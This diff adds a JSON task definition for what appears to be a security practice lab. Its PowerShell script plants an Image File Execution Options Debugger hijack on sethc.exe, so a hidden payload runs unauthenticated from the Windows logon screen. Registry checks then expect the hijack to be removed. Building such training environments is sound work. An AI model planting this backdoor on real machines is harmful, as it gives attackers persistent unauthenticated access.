@@ -1,0 +1,10 @@
+{
+  "name": "ifeo-backdoor-win",
+  "description": "Practice-box helper (Windows): plants an Image File Execution Options (IFEO) Debugger hijack on an accessibility executable -- every launch of the accessibility tool (e.g. sethc.exe at the logon screen) instead starts the attacker's hidden command, unauthenticated, from the logon desktop. Writes the payload script and the Debugger value. The hardened state is the Debugger value gone. Vars: EXECUTABLE (optional, default 'sethc.exe'); PAYLOAD_PATH (required); PAYLOAD_BODY (optional); DEBUGGER (optional, defaults to a hidden powershell -File launch of PAYLOAD_PATH). Pairs with registry_value checks expecting the Debugger value absent under Image File Execution Options\\<EXECUTABLE>. Idempotent.",
+  "platform": "windows",
+  "category": "misconfiguration",
+  "type": "powershell",
+  "run_as": "Administrator",
+  "script": "if (-not $PAYLOAD_PATH) { throw 'PAYLOAD_PATH is required' }\n$exe = if ($EXECUTABLE) { $EXECUTABLE } else { 'sethc.exe' }\n$dir = Split-Path $PAYLOAD_PATH -Parent\nNew-Item -ItemType Directory -Force -Path $dir | Out-Null\nif ($PAYLOAD_BODY) { Set-Content -Path $PAYLOAD_PATH -Value $PAYLOAD_BODY -Encoding ascii }\n$debugger = if ($DEBUGGER) { $DEBUGGER } else { \"powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `\"$PAYLOAD_PATH`\"\" }\n$k = \"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\$exe\"\nif (-not (Test-Path $k)) { New-Item -Path $k -Force | Out-Null }\nSet-ItemProperty -Path $k -Name Debugger -Value $debugger -Type String\nWrite-Output \"Debugger hijack planted on $exe\"",
+  "depends_on": []
+}
